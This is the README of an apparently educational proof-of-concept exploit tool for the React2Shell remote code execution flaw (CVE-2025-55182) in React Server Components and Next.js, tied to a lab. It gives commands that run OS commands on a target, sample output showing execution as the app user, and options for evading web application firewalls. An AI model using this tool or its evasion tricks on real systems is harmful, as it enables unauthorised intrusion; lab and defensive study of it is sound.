# React2Shell Scanner – with PoC

> **CVE-2025-55182 – React Server Components RCE PoC**  
> Educational exploit client for the Hidden Investigations React2Shell lab.

This repository contains a single-host proof-of-concept (PoC) exploit tool for the **[React2Shell](https://react2shell.com/)** vulnerability (CVE-2025-55182) targeting misconfigured **React Server Components / Next.js** applications.

It is designed to be used **only** against the official **[Hidden Investigations React2Shell lab](https://github.com/hidden-investigations/react2shell-vulnlab.git)** or systems you explicitly own / administer.

---

## ⚠️ Legal & Ethical Disclaimer

This project is provided **strictly for educational and defensive security research**:

- Only use this tool on:
  - The official **Hidden Investigations React2Shell lab**, or
  - Systems you own or have **explicit written permission** to test.
- Do **not** point this at random websites, production systems, or infrastructure you don’t control.
- The authors and Hidden Investigations take **no responsibility** for misuse or damage.

By using this tool, you agree to follow all applicable laws and regulations.

---

## Features

- 🔥 **React2Shell exploit client** for CVE-2025-55182
- 🎯 **Single-host focused** (no mass scanning)
- 📡 Support for **custom paths** and **path lists**
- 🧪 **Safe check mode** (no OS commands, just a detection probe)
- 🪟 **Windows-friendly mode** (`whoami` default)
- 🛡️ **WAF bypass helpers**:
  - Junk multipart field (`--waf-bypass`, `--waf-bypass-size`)
  - Vercel layout tweak (`--vercel-waf-bypass`)
- 🔐 TLS options (`--insecure`, custom headers)
- 🧾 JSON output (`-o/--output`, `--all-results`)
- 🧘 Clean **quiet mode** output (perfect for piping to other tools)


---

## Requirements

- **Python**: 3.8+ (tested with Python 3.10+)
- **Dependencies**:
  - `requests`

Install dependencies via:

```bash
pip install -r requirements.txt
```

---

## Installation

1. Clone the Hidden Investigations repo:

```bash
git clone https://github.com/hidden-investigations/react2shell-poc.git
cd react2shell-poc
```

2. (Optional but recommended) Create a virtualenv:

```bash
python3 -m venv venv
source venv/bin/activate   # On Windows: venv\Scripts\activate
```

3. Install requirements:

```bash
pip install -r requirements.txt
```

4. Run the tool:

```bash
python3 tool.py -h
```

---

## Usage

Basic help:

```bash
python3 tool.py -h
```

The tool requires a **target URL**:

```bash
python3 tool.py -t http://localhost:3000 -c "id"
# or
python3 tool.py --url http://localhost:3000 -c "id"
```

If you run it **without** `-t/--target` or `-u/--url`, it prints a **branded help message** and exits.

---

## Command Line Options

### Target & paths

| Option              | Description                                                   | Default     |
|---------------------|---------------------------------------------------------------|-------------|
| `-t`, `--target`    | Target URL or domain (required unless `--url` is used)       | _None_      |
| `-u`, `--url`       | Alias for `--target` (Assetnote-style flag)                  | _None_      |
| `--path`            | Path to test (can be used multiple times, e.g. `/`, `/_next`) | `/`         |
| `--path-file`       | File containing paths to test (one per line)                 | _None_      |

> **Note:** This PoC is **single-host only**. The `-l/--list` option is present but intentionally disabled.

---

### Exploit / payload behavior

| Option                   | Description                                                                                  | Default  |
|--------------------------|----------------------------------------------------------------------------------------------|----------|
| `-c`, `--command`        | Command to execute on the target (when exploitation succeeds)                               | `id`     |
| `--safe-check`           | Use a SAFE_CHECK payload (no OS command, just a marker string)                              | off      |
| `--windows`              | Adjust defaults for Windows targets (e.g. use `whoami` when command is `id`)               | off      |
| `--waf-bypass`           | Prepend a large junk multipart field to the request body for WAF evasion                   | off      |
| `--waf-bypass-size KB`   | Size of the junk field in KB when using `--waf-bypass`                                      | `128`    |
| `--vercel-waf-bypass`    | Use an alternate multipart layout intended to tweak Vercel WAF behavior (simplified PoC)   | off      |

---

### HTTP / TLS options

| Option               | Description                                                   | Default |
|----------------------|---------------------------------------------------------------|---------|
| `--timeout SECONDS`  | Request timeout in seconds                                   | `15` (or `20` if `--waf-bypass` and no timeout set) |
| `-k`, `--insecure`   | Disable SSL verification (like `curl -k`)                   | off     |
| `-H`, `--header`     | Custom header, e.g. `-H "X-Forwarded-For: 127.0.0.1"` (repeatable) | _None_  |

---

### Output / UX options

| Option                 | Description                                                                                      | Default |
|------------------------|--------------------------------------------------------------------------------------------------|---------|
| `-o`, `--output FILE`  | Write JSON results to `FILE`                                                                     | _None_  |
| `--all-results`        | When using `--output`, include **non-vulnerable** results as well                               | off     |
| `-v`, `--verbose`      | Verbose mode – show HTTP status and `X-Action-Redirect` header                                  | off     |
| `-q`, `--quiet`        | Quiet mode – prints **only the normalized command output** on success                           | off     |
| `--no-color`           | Disable colored terminal output                                                                 | off     |

Quiet mode example (nice, multi-line output):

```bash
python3 tool.py --url http://localhost:3000 -q -c "ls -la"
```

Output:

```text
total 12
drwxr-xr-x    1 root     root            10 Dec 13 21:13 .
drwxr-xr-x    1 root     root             0 Dec 13 21:13 ..
drwxr-xr-x    1 nextjs   nodejs          12 Dec 13 21:13 .next
drwxr-xr-x    1 nextjs   nodejs         396 Dec 13 21:13 node_modules
-rw-r--r--    1 nextjs   nodejs         733 Dec 13 21:13 package.json
drwxr-xr-x    1 root     root            12 Dec 13 19:13 public
-rw-r--r--    1 nextjs   nodejs        5661 Dec 13 21:13 server.js
```

---

### Bulk scanning flags (intentionally disabled)

The following flags exist to mirror Assetnote’s CLI, but are **not implemented** in this PoC to avoid mass scanning misuse:

| Option          | Status              |
|-----------------|---------------------|
| `-l`, `--list`  | **Not implemented** |
| `--threads N`   | **Not implemented** |

If you use `-l/--list`, the tool will print a warning and exit, suggesting you use Assetnote’s original `react2shell-scanner` for large-scale safe scanning.

---

## Examples

Run against local lab:

```bash
python3 tool.py --url http://localhost:3000 -c "whoami"
```

Use WAF bypass with a larger junk field:

```bash
python3 tool.py -t http://localhost:3000   --waf-bypass --waf-bypass-size 256   -c "id"
```

Multiple paths on the same host:

```bash
python3 tool.py -t http://localhost:3000   --path /   --path /_next/data   -c "id"
```

Paths from file:

```bash
python3 tool.py -t http://localhost:3000   --path-file paths.txt   -c "id"
```

Safe check mode (no OS commands executed):

```bash
python3 tool.py -t http://localhost:3000 --safe-check
```

JSON output of results to file:

```bash
python3 tool.py -t http://localhost:3000   --path / --path /_next   -c "id"   -o results.json --all-results
```

---

## JSON Output Format

When `-o/--output` is used, the tool writes an array of objects like:

```json
[
  {
    "url": "http://localhost:3000/",
    "path": "/",
    "success": true,
    "status": "success",
    "output": "uid=1000(nextjs) gid=1000(nodejs) groups=1000(nodejs)",
    "http": {
      "status_code": 302,
      "headers": {
        "X-Action-Redirect": "NEXT_REDIRECT;push;/login?a=uid%3D1000%28nextjs%29;307;",
        "...": "..."
      }
    }
  }
]
```

---

## Credits & Acknowledgements

- **[Hidden Investigations](https://hiddeninvestigations.net/)** – for publishing the React2Shell educational lab and PoC client.
- **[@sakibulalikhan](https://github.com/sakibulalikhan)** – tool author.
- **Assetnote** – inspiration for WAF bypass ideas via their `react2shell-scanner`.

---

## License

This project is licensed under the **MIT License**. See [`LICENSE`](LICENSE) for details.

📬 Contact us: [hi@hiddeninvestigations.net](mailto:hi@hiddeninvestigations.net)
